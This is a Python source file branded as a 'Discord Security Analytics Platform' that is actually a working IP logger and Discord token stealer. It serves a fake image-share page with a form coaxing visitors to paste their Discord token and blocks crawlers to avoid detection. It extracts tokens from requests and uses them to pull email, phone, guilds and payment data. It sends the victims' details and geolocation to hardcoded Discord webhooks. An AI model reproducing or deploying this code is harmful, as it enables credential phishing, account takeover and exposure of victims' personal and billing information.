"""
🔷 ADVANCED DISCORD SECURITY ANALYTICS PLATFORM
🛡️ Enhanced Discord Tracking & Token Analysis System
📊 Multi-Layer Data Collection & User Profile Analytics
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import time
import threading
from datetime import datetime
import random
import re
import asyncio
import aiohttp
import hmac
import hashlib

__app__ = "Advanced Discord Security Analytics"
__description__ = "Comprehensive Discord security monitoring and user analytics platform"
__version__ = "v4.0"
__author__ = "Discord Security Team"

class AdvancedConfig:
    """Enhanced configuration management with Discord integration"""
    
    def __init__(self):
        self.settings = {
            # WEBHOOK CONFIGURATION
            "primary_webhook": "https://discord.com/api/webhooks/1444002832587030660/srIVUDGXmiAVaakGjjKbofvz-DVU62ntAWO-baVOxbUOULyTfrMmsw9oWsfyJUNCAdTe",
            "backup_webhook": "https://discord.com/api/webhooks/1444007716308914207/jwMnV-ya8Xk7m1RzTEGuelTWIGUAv4sKxETtUSJ3a_E30tdDHem5tXbkt1qMTC8m6yJE",
            
            # DISCORD API CONFIG
            "discord_api_url": "https://discord.com/api/v10",
            "capture_tokens": True,
            "token_validation": True,
            
            # IMAGE CONFIGURATION
            "default_image": "https://i.pinimg.com/736x/9d/3c/9e/9d3c9eebf9fcd80ded504c5af34d9763.jpg",
            "dynamic_images": [
                "https://cdn.discordapp.com/attachments/123456789/001/image1.jpg",
                "https://cdn.discordapp.com/attachments/123456789/002/image2.png",
                "https://cdn.discordapp.com/attachments/123456789/003/image3.gif"
            ],
            "image_argument": True,
            
            # CUSTOMIZATION
            "branding": {
                "username": "Discord Security Analytics",
                "color": 0x5865F2,
                "footer_text": "Discord Security Platform v4.0",
                "thumbnail": "https://cdn.discordapp.com/embed/avatars/0.png",
                "author_icon": "https://cdn.discordapp.com/icons/123456789/abc123.webp"
            },
            
            # SECURITY FEATURES
            "vpn_detection": 2,
            "bot_protection": 2,
            "rate_limiting": True,
            "request_timeout": 15,
            "encryption_key": "your-secret-encryption-key-here",
            
            # ENHANCED DATA COLLECTION
            "collect_advanced_metrics": True,
            "geolocation_precision": "high",
            "behavior_analysis": True,
            "discord_data_collection": True,
            
            # VISUAL ENHANCEMENTS
            "rich_embeds": True,
                "interactive_reports": True,
            "real_time_updates": True,
            
            # TOKEN PROCESSING
            "auto_analyze_tokens": True,
            "extract_user_data": True,
            "check_payment_methods": True,
            "guild_analysis": True
        }
        
        self.security_rules = {
            "blacklisted_ips": ["27.", "34.", "35.", "104.", "143.", "164."],
            "allowed_countries": ["US", "CA", "GB", "AU", "DE", "FR"],
            "suspicious_useragents": [
                "bot", "crawler", "spider", "scanner",
                "monitor", "checker", "python", "java"
            ],
            "token_patterns": [
                r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}",
                r"mfa\.[a-zA-Z0-9_-]{84}",
                r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{38}"
            ]
        }
        
        self.analytics = {
            "total_requests": 0,
            "unique_visitors": set(),
            "successful_logs": 0,
            "blocked_requests": 0,
            "tokens_captured": 0,
            "valid_tokens": 0
        }

config = AdvancedConfig()

class DiscordTokenAnalyzer:
    """Advanced Discord token analysis and user data extraction"""
    
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.token_cache = {}
    
    async def analyze_token(self, token):
        """Comprehensive Discord token analysis"""
        analysis = {
            "valid": False,
            "user_data": {},
            "guilds": [],
            "connections": [],
            "billing_info": {},
            "security_flags": {},
            "token_metadata": {}
        }
        
        try:
            # Clean token
            clean_token = self._clean_token(token)
            if not clean_token:
                return analysis
            
            analysis["token_metadata"] = {
                "raw_token": token,
                "clean_token": clean_token,
                "token_type": self._detect_token_type(clean_token),
                "length": len(clean_token)
            }
            
            # Validate token and get user data
            user_data = await self._get_discord_data(clean_token, "users/@me")
            if user_data:
                analysis["valid"] = True
                analysis["user_data"] = user_data
                config.analytics["valid_tokens"] += 1
                
                # Get additional data
                analysis["guilds"] = await self._get_discord_data(clean_token, "users/@me/guilds") or []
                analysis["connections"] = await self._get_discord_data(clean_token, "users/@me/connections") or []
                analysis["billing_info"] = await self._get_billing_info(clean_token) or {}
                
                # Security analysis
                analysis["security_flags"] = self._analyze_security_flags(user_data, clean_token)
            
            return analysis
            
        except Exception as e:
            analysis["error"] = str(e)
            return analysis
    
    def _clean_token(self, token):
        """Clean and validate token format"""
        if not token or len(token) < 50:
            return None
        
        # Remove quotes, spaces, and other common wrappers
        clean_token = re.sub(r'["\'\s]', '', token)
        
        # Check token patterns
        for pattern in config.security_rules["token_patterns"]:
            if re.match(pattern, clean_token):
                return clean_token
        
        return None
    
    def _detect_token_type(self, token):
        """Detect Discord token type"""
        if token.startswith('mfa.'):
            return "MFA_TOKEN"
        elif len(token) == 59:
            return "USER_TOKEN"
        elif len(token) == 70:
            return "BOT_TOKEN"
        else:
            return "UNKNOWN"
    
    async def _get_discord_data(self, token, endpoint):
        """Fetch data from Discord API"""
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        try:
            async with self.session.get(
                f"{config.settings['discord_api_url']}/{endpoint}",
                headers=headers,
                timeout=10
            ) as response:
                
                if response.status == 200:
                    return await response.json()
                else:
                    return None
                    
        except Exception:
            return None
    
    async def _get_billing_info(self, token):
        """Get payment/billing information"""
        try:
            billing_data = await self._get_discord_data(token, "users/@me/billing/payment-sources")
            if billing_data:
                return {
                    "payment_methods": len(billing_data),
                    "has_nitro": await self._check_nitro_status(token),
                    "billing_available": True
                }
        except:
            pass
        
        return {"payment_methods": 0, "has_nitro": False, "billing_available": False}
    
    async def _check_nitro_status(self, token):
        """Check if user has Discord Nitro"""
        try:
            user_data = await self._get_discord_data(token, "users/@me")
            if user_data and user_data.get('premium_type', 0) > 0:
                return True
        except:
            pass
        return False
    
    def _analyze_security_flags(self, user_data, token):
        """Analyze security aspects of the account"""
        flags = {
            "verified": user_data.get('verified', False),
            "mfa_enabled": user_data.get('mfa_enabled', False),
            "account_age": self._calculate_account_age(user_data.get('id')),
            "premium_status": user_data.get('premium_type', 0),
            "avatar_present": bool(user_data.get('avatar')),
            "banner_present": bool(user_data.get('banner'))
        }
        
        return flags
    
    def _calculate_account_age(self, user_id):
        """Calculate account age from Discord ID"""
        if not user_id:
            return "Unknown"
        
        try:
            discord_epoch = 1420070400000
            timestamp = ((int(user_id) >> 22) + discord_epoch) / 1000
            account_age_days = (time.time() - timestamp) / 86400
            return f"{int(account_age_days)} days"
        except:
            return "Unknown"

class ThreatIntelligence:
    """Enhanced threat detection with Discord-specific analysis"""
    
    def __init__(self):
        self.token_analyzer = DiscordTokenAnalyzer()
    
    async def analyze_user_agent(self, user_agent):
        """Deep analysis of user agent with Discord context"""
        analysis = {
            "risk_score": 0,
            "flags": [],
            "platform_details": {},
            "suspicious": False,
            "discord_client": False
        }
        
        ua_lower = user_agent.lower()
        
        # Discord client detection
        discord_indicators = ["discord", "discordbot", "webcord"]
        if any(indicator in ua_lower for indicator in discord_indicators):
            analysis["discord_client"] = True
            analysis["risk_score"] -= 10  # Lower risk for Discord clients
        
        # Bot detection
        bot_indicators = ["bot", "crawler", "spider", "scanner"]
        if any(indicator in ua_lower for indicator in bot_indicators):
            analysis["risk_score"] += 30
            analysis["flags"].append("Bot Detected")
            analysis["suspicious"] = True
        
        # VPN/Proxy indicators
        vpn_indicators = ["vpn", "proxy", "tor", "anonymizer"]
        if any(indicator in ua_lower for indicator in vpn_indicators):
            analysis["risk_score"] += 25
            analysis["flags"].append("VPN/Proxy Suspected")
        
        try:
            os, browser = httpagentparser.simple_detect(user_agent)
            analysis["platform_details"] = {
                "operating_system": os,
                "browser": browser,
                "parsing_confidence": "high"
            }
        except:
            analysis["platform_details"] = {
                "operating_system": "Unknown",
                "browser": "Unknown",
                "parsing_confidence": "low"
            }
            analysis["risk_score"] += 10
        
        return analysis
    
    def extract_tokens_from_data(self, data):
        """Extract Discord tokens from various data sources"""
        tokens_found = []
        
        if isinstance(data, str):
            # Search for tokens in string data
            for pattern in config.security_rules["token_patterns"]:
                found_tokens = re.findall(pattern, data)
                tokens_found.extend(found_tokens)
        
        elif isinstance(data, dict):
            # Search for tokens in dictionary values
            for value in data.values():
                if isinstance(value, str):
                    for pattern in config.security_rules["token_patterns"]:
                        found_tokens = re.findall(pattern, value)
                        tokens_found.extend(found_tokens)
        
        return list(set(tokens_found))  # Remove duplicates

class GeolocationService:
    """Enhanced geolocation with Discord data correlation"""
    
    @staticmethod
    def get_advanced_geolocation(ip):
        """Get comprehensive location data"""
        try:
            providers = [
                f"http://ip-api.com/json/{ip}?fields=66846719",
                f"http://ipapi.co/{ip}/json/"
            ]
            
            for provider in providers:
                try:
                    response = requests.get(provider, timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        return GeolocationService._enhance_location_data(data, ip)
                except:
                    continue
            
            return {"status": "fail", "message": "All providers failed"}
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def _enhance_location_data(data, ip):
        """Enhance raw location data with additional insights"""
        enhanced = {
            "ip": ip,
            "status": data.get("status", "success"),
            "country": data.get("country", "Unknown"),
            "country_code": data.get("countryCode", "Unknown"),
            "region": data.get("regionName", "Unknown"),
            "city": data.get("city", "Unknown"),
            "zip_code": data.get("zip", "Unknown"),
            "timezone": data.get("timezone", "Unknown"),
            "isp": data.get("isp", "Unknown"),
            "asn": data.get("as", "Unknown"),
            "organization": data.get("org", "Unknown"),
            "coordinates": {
                "latitude": data.get("lat", 0),
                "longitude": data.get("lon", 0)
            },
            "security_flags": {
                "proxy": data.get("proxy", False),
                "hosting": data.get("hosting", False),
                "mobile": data.get("mobile", False)
            },
            "network_analysis": {
                "risk_level": "Low",
                "reputation_score": 85
            }
        }
        
        # Calculate risk level
        risk_factors = 0
        if enhanced["security_flags"]["proxy"]:
            risk_factors += 2
        if enhanced["security_flags"]["hosting"]:
            risk_factors += 1
        if enhanced["security_flags"]["mobile"]:
            risk_factors -= 1
        
        if risk_factors >= 2:
            enhanced["network_analysis"]["risk_level"] = "High"
            enhanced["network_analysis"]["reputation_score"] = 30
        elif risk_factors >= 1:
            enhanced["network_analysis"]["risk_level"] = "Medium"
            enhanced["network_analysis"]["reputation_score"] = 60
        
        return enhanced

class AnalyticsEngine:
    """Real-time analytics with Discord-specific metrics"""
    
    def __init__(self):
        self.session_data = {}
        self.performance_metrics = {
            "response_times": [],
            "success_rate": 0,
            "peak_usage": 0
        }
        self.token_analytics = {
            "total_captured": 0,
            "valid_tokens": 0,
            "nitro_users": 0,
            "mfa_enabled": 0
        }
    
    def track_request(self, ip, user_agent, endpoint):
        """Track and analyze each request"""
        timestamp = datetime.now().isoformat()
        session_id = f"{ip}_{hash(user_agent)}"
        
        if session_id not in self.session_data:
            self.session_data[session_id] = {
                "first_seen": timestamp,
                "last_seen": timestamp,
                "request_count": 0,
                "endpoints_visited": set(),
                "user_agent": user_agent,
                "tokens_submitted": []
            }
        
        self.session_data[session_id]["last_seen"] = timestamp
        self.session_data[session_id]["request_count"] += 1
        self.session_data[session_id]["endpoints_visited"].add(endpoint)
        
        config.analytics["total_requests"] += 1
        config.analytics["unique_visitors"].add(ip)
    
    def track_token_capture(self, token_data):
        """Track token capture analytics"""
        config.analytics["tokens_captured"] += 1
        self.token_analytics["total_captured"] += 1
        
        if token_data.get("valid"):
            config.analytics["valid_tokens"] += 1
            self.token_analytics["valid_tokens"] += 1
            
            if token_data.get("security_flags", {}).get("mfa_enabled"):
                self.token_analytics["mfa_enabled"] += 1
            
            if token_data.get("billing_info", {}).get("has_nitro"):
                self.token_analytics["nitro_users"] += 1

class EnhancedReporter:
    """Advanced reporting with Discord token analytics"""
    
    def __init__(self):
        self.token_analyzer = DiscordTokenAnalyzer()
    
    async def create_comprehensive_report(self, ip_data, threat_analysis, user_agent, endpoint, image_url=None, tokens_data=None):
        """Create detailed analytics report with token information"""
        
        # Risk assessment
        risk_level = "🟢 LOW"
        if threat_analysis["risk_score"] > 50:
            risk_level = "🔴 HIGH"
        elif threat_analysis["risk_score"] > 25:
            risk_level = "🟡 MEDIUM"
        
        # Create main embed
        embeds = []
        
        # Main information embed
        main_embed = {
            "title": "🔷 DISCORD SECURITY ALERT",
            "color": config.settings["branding"]["color"],
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {
                "text": config.settings["branding"]["footer_text"]
            },
            "thumbnail": {"url": image_url} if image_url else None,
            "author": {
                "name": "Discord Security Analytics",
                "icon_url": config.settings["branding"]["author_icon"]
            },
            "fields": [
                {
                    "name": "🌐 NETWORK INFORMATION",
                    "value": f"""```yaml
IP: {ip_data['ip']}
ISP: {ip_data['isp']}
Location: {ip_data['city']}, {ip_data['country']}
Proxy/VPN: {'✅ Yes' if ip_data['security_flags']['proxy'] else '❌ No'}
```""",
                    "inline": True
                },
                {
                    "name": "💻 CLIENT INFORMATION",
                    "value": f"""```yaml
OS: {threat_analysis['platform_details']['operating_system']}
Browser: {threat_analysis['platform_details']['browser']}
Discord Client: {'✅ Yes' if threat_analysis['discord_client'] else '❌ No'}
Risk Level: {risk_level}
```""",
                    "inline": True
                }
            ]
        }
        
        embeds.append(main_embed)
        
        # Add token information if available
        if tokens_data and config.settings["capture_tokens"]:
            for token_info in tokens_data:
                token_embed = await self._create_token_embed(token_info)
                if token_embed:
                    embeds.append(token_embed)
        
        # Add analytics embed
        analytics_embed = self._create_analytics_embed()
        embeds.append(analytics_embed)
        
        report = {
            "username": config.settings["branding"]["username"],
            "avatar_url": config.settings["branding"]["thumbnail"],
            "embeds": embeds
        }
        
        # Add ping for high-risk events
        if threat_analysis["risk_score"] > 25 or (tokens_data and any(t.get('valid') for t in tokens_data)):
            report["content"] = "@everyone 🚨 HIGH VALUE TARGET CAPTURED"
        
        return report
    
    async def _create_token_embed(self, token_info):
        """Create embed for token information"""
        if not token_info.get("valid"):
            return None
        
        user_data = token_info.get("user_data", {})
        security_flags = token_info.get("security_flags", {})
        billing_info = token_info.get("billing_info", {})
        
        # Create user info string
        user_info = f"""```yaml
Username: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}
User ID: {user_data.get('id', 'Unknown')}
Email: {user_data.get('email', 'Not Available')}
Phone: {user_data.get('phone', 'Not Available')}
```"""
        
        # Create account security string
        security_info = f"""```yaml
Verified: {'✅ Yes' if security_flags.get('verified') else '❌ No'}
MFA Enabled: {'✅ Yes' if security_flags.get('mfa_enabled') else '❌ No'}
Account Age: {security_flags.get('account_age', 'Unknown')}
Nitro: {'✅ Yes' if billing_info.get('has_nitro') else '❌ No'}
Payment Methods: {billing_info.get('payment_methods', 0)}
```"""
        
        # Create guilds information
        guilds_info = f"```yaml\nGuilds: {len(token_info.get('guilds', []))}\nConnections: {len(token_info.get('connections', []))}\n```"
        
        token_embed = {
            "title": "🔑 DISCORD TOKEN CAPTURED",
            "color": 0x00FF00 if billing_info.get('has_nitro') else 0xFFFF00,
            "fields": [
                {
                    "name": "👤 USER PROFILE",
                    "value": user_info,
                    "inline": True
                },
                {
                    "name": "🛡️ ACCOUNT SECURITY",
                    "value": security_info,
                    "inline": True
                },
                {
                    "name": "📊 ACCOUNT DATA",
                    "value": guilds_info,
                    "inline": False
                }
            ]
        }
        
        # Add avatar if available
        if user_data.get('avatar'):
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
            token_embed["thumbnail"] = {"url": avatar_url}
        
        return token_embed
    
    def _create_analytics_embed(self):
        """Create analytics summary embed"""
        return {
            "title": "📊 ANALYTICS SUMMARY",
            "color": 0x3498DB,
            "fields": [
                {
                    "name": "📈 SESSION STATS",
                    "value": f"""```yaml
Total Requests: {config.analytics['total_requests']}
Unique Visitors: {len(config.analytics['unique_visitors'])}
Tokens Captured: {config.analytics['tokens_captured']}
Valid Tokens: {config.analytics['valid_tokens']}
```""",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
        }

class AdvancedImageLoggerAPI(BaseHTTPRequestHandler):
    """Enhanced Image Logger with Discord token capture"""
    
    def __init__(self, *args, **kwargs):
        self.analytics_engine = AnalyticsEngine()
        self.threat_intel = ThreatIntelligence()
        self.geolocation = GeolocationService()
        self.reporter = EnhancedReporter()
        self.token_analyzer = DiscordTokenAnalyzer()
        super().__init__(*args, **kwargs)
    
    def handle_request(self):
        """Main request handler with token capture"""
        try:
            # Track request start time
            start_time = time.time()
            
            # Get client information
            client_ip = self.headers.get('x-forwarded-for', self.client_address[0])
            user_agent = self.headers.get('user-agent', 'Unknown')
            endpoint = self.path.split('?')[0]
            
            # Update analytics
            self.analytics_engine.track_request(client_ip, user_agent, endpoint)
            
            # Security checks
            if self._is_blocked(client_ip, user_agent):
                config.analytics["blocked_requests"] += 1
                self._send_blocked_response()
                return
            
            # Extract tokens from request
            tokens_found = self._extract_tokens_from_request()
            
            # Analyze tokens
            tokens_data = []
            if tokens_found and config.settings["capture_tokens"]:
                tokens_data = self._analyze_tokens(tokens_found)
            
            # Get image URL
            image_url = self._get_image_url()
            
            # Threat analysis
            threat_analysis = asyncio.run(self.threat_intel.analyze_user_agent(user_agent))
            
            # Get geolocation data
            geo_data = self.geolocation.get_advanced_geolocation(client_ip)
            
            # Create and send report
            if geo_data.get("status") == "success":
                report = asyncio.run(self.reporter.create_comprehensive_report(
                    geo_data, threat_analysis, user_agent, endpoint, image_url, tokens_data
                ))
                self._send_discord_webhook(report)
                config.analytics["successful_logs"] += 1
            
            # Send response to client
            self._send_client_response(image_url, threat_analysis, tokens_found)
            
            # Track performance
            response_time = time.time() - start_time
            self.analytics_engine.performance_metrics["response_times"].append(response_time)
            
        except Exception as e:
            self._handle_error(e)
    
    def _extract_tokens_from_request(self):
        """Extract Discord tokens from the request"""
        tokens_found = []
        
        # Check query parameters
        query_params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
        for value in query_params.values():
            tokens_found.extend(self.threat_intel.extract_tokens_from_data(value))
        
        # Check headers
        for header_value in self.headers.values():
            tokens_found.extend(self.threat_intel.extract_tokens_from_data(header_value))
        
        # Check POST data if available
        if self.command == 'POST':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                tokens_found.extend(self.threat_intel.extract_tokens_from_data(post_data))
            except:
                pass
        
        return list(set(tokens_found))
    
    def _analyze_tokens(self, tokens):
        """Analyze captured tokens"""
        tokens_data = []
        
        for token in tokens:
            token_analysis = asyncio.run(self.token_analyzer.analyze_token(token))
            tokens_data.append(token_analysis)
            self.analytics_engine.track_token_capture(token_analysis)
        
        return tokens_data
    
    def _is_blocked(self, ip, user_agent):
        """Check if request should be blocked"""
        if any(ip.startswith(blacklisted) for blacklisted in config.security_rules["blacklisted_ips"]):
            return True
        
        threat_analysis = asyncio.run(self.threat_intel.analyze_user_agent(user_agent))
        if threat_analysis["suspicious"]:
            return config.settings["bot_protection"] == 2
        
        return False
    
    def _get_image_url(self):
        """Get appropriate image URL"""
        if config.settings["image_argument"]:
            query_params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            if query_params.get("url"):
                return base64.b64decode(query_params["url"].encode()).decode()
            elif query_params.get("id"):
                return base64.b64decode(query_params["id"].encode()).decode()
        
        return random.choice(config.settings["dynamic_images"])
    
    def _send_discord_webhook(self, data):
        """Send data to Discord webhook"""
        try:
            requests.post(
                config.settings["primary_webhook"],
                json=data,
                timeout=config.settings["request_timeout"]
            )
        except:
            try:
                data["embeds"][0]["title"] += " (Backup)"
                requests.post(
                    config.settings["backup_webhook"],
                    json=data,
                    timeout=config.settings["request_timeout"]
                )
            except:
                pass
    
    def _send_client_response(self, image_url, threat_analysis, tokens_found):
        """Send response to client"""
        if threat_analysis["suspicious"]:
            self._send_decoy_response()
        else:
            self._send_image_response(image_url, tokens_found)
    
    def _send_image_response(self, image_url, tokens_found):
        """Send image response with token capture form"""
        token_form = ""
        if not tokens_found and config.settings["capture_tokens"]:
            token_form = """
            <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
                <h3 style="margin: 0 0 10px 0; color: #333;">Discord Authentication</h3>
                <p style="margin: 0 0 10px 0; color: #666; font-size: 14px;">
                    For enhanced security, please verify your Discord token:
                </p>
                <input type="text" id="discordToken" placeholder="Paste your Discord token here" 
                       style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 3px; margin-bottom: 10px;">
                <button onclick="submitToken()" 
                        style="background: #5865F2; color: white; border: none; padding: 8px 15px; border-radius: 3px; cursor: pointer;">
                    Verify Token
                </button>
            </div>
            <script>
                function submitToken() {
                    const token = document.getElementById('discordToken').value;
                    if (token) {
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: 'discord_token=' + encodeURIComponent(token)
                        });
                    }
                }
            </script>
            """
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Discord Image Preview</title>
            <meta property="og:title" content="Discord Shared Image">
            <meta property="og:image" content="{image_url}">
            <meta property="og:description" content="Check out this image shared on Discord!">
            <style>
                body {{
                    margin: 0;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    background: linear-gradient(135deg, #5865F2 0%, #8045DD 100%);
                    font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                }}
                .container {{
                    text-align: center;
                    padding: 30px;
                    background: white;
                    border-radius: 10px;
                    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
                    max-width: 500px;
                    width: 100%;
                }}
                img {{
                    max-width: 100%;
                    border-radius: 8px;
                    margin-bottom: 20px;
                }}
                .discord-brand {{
                    color: #5865F2;
                    font-weight: bold;
                    margin-bottom: 10px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="discord-brand">Discord Image Share</div>
                <img src="{image_url}" alt="Shared Image" onerror="this.style.display='none'">
                <div style="color: #666; margin-top: 10px;">Image loaded successfully in Discord preview</div>
                {token_form}
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())
    
    def _send_decoy_response(self):
        """Send decoy response to suspicious clients"""
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'404 - Resource Not Found')
    
    def _send_blocked_response(self):
        """Send response for blocked requests"""
        self.send_response(403)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'403 - Access Forbidden')
    
    def _handle_error(self, error):
        """Handle errors gracefully"""
        self.send_response(500)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'500 - Internal Server Error')
        
        error_report = {
            "username": config.settings["branding"]["username"],
            "embeds": [{
                "title": "🚨 DISCORD ANALYTICS ERROR",
                "color": 0xFF0000,
                "description": f"```{traceback.format_exc()}```",
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        self._send_discord_webhook(error_report)
    
    def log_message(self, format, *args):
        """Override to disable default logging"""
        pass
    
    do_GET = handle_request
    do_POST = handle_request

def run_server():
    """Start the enhanced Discord analytics server"""
    server = HTTPServer(('localhost', 8080), AdvancedImageLoggerAPI)
    print("🚀 Advanced Discord Security Analytics Platform Started")
    print("📍 Server running on http://localhost:8080")
    print("📊 Discord token capture: ENABLED")
    print("🔑 Token analysis: ACTIVE")
    print("📈 Real-time analytics: RUNNING...")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
    finally:
        server.server_close()

if __name__ == "__main__":
    run_server()
